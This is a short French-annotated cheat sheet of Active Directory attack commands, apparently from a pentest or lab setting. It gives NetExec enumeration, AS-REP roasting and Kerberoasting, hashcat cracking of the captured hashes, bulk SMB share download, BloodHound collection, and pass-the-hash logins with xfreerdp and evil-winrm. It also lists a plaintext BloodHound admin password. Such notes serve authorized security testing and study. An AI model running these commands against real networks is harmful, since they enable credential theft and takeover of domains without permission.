## NXC

```bash
nxc smb $IP $ ## Check domain info

nxc smb $IP -u $USER -p $PASSWORD ## Auth SMB 

nxc smb $IP -u $USER -p $PASSWORD --shares ## Liste share smb

nxc ldap $IP -u $USER -p "" -d $DOMAIN --asreproast <file> ## AS-REP roasting 

nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --users ## enum user LDAP

nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --groups ## enum groupe LDAP

nxc ldap $IP -u $USER -p $PASSWORD -d $DOMAIN --user <USER> ## Info user LDAP

nxc winrm $IP -u $USER -p $PASSWORD ## Connexion WinRM
```

## smbclient

```bash
smbclient //$IP/NAME-SHARE$ -U "$DOMAIN/$USER%$PASSWORD" ## Connexion share SMB

## Pour tout récupérer 
smb: \> recurse ON  
smb: \> prompt OFF  
smb: \> mget *

```

## Hashcat

```bash
hashcat -m 18200 asrep.txt /opt/lists/rockyou.txt ## Crack le hash AS-REP
hashcat -m 13100 hash.txt /opt/lists/rockyou.txt ## Crack le hash Kerberos


```

## Bloodhound

```bash
bloodhound-python -u $USER -p $PASSWORD -d $DOMAIN -ns $IP -c All --zip ## Récupération des éléments de l'AD

bloodhound-ce &>/dev/null & ## Interface Web
user: admin
mdp: @PentestAD1234!!

```

## GetUsersSPN

```bash
GetUserSPNs.py imperium.local/$USER:$PASSWORD -dc-ip $IP -request-user thufir.hawat ## Récupérer ticket kerberos 
```

## RDP

```bash
xfreerdp /u:$USER /pth:$NT_HASH /d:$DOMAIN /v:$IP
```

## WinRM

```bash
evil-winrm -i $IP -u $USER -H $NT_HASH
```
